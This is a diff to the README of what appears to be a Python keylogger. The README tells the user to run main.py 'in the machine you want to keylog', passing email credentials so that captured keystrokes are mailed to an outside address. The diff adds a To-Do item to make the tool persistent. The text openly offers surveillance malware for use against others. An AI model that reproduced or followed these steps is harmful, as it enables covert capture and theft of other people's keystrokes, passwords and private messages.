@@ -21,3 +21,9 @@ STEP 3 - Start the script from the console in the machine your want to keylog :
 python main.py "myemail@gmail.com" "myemailpassword" "theemailyouwanttosendthelogs@mail.com
 
 To stop it close the cli or kill the process if you use executed this script without the console
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# To-Do 
+
+- Make it persistent
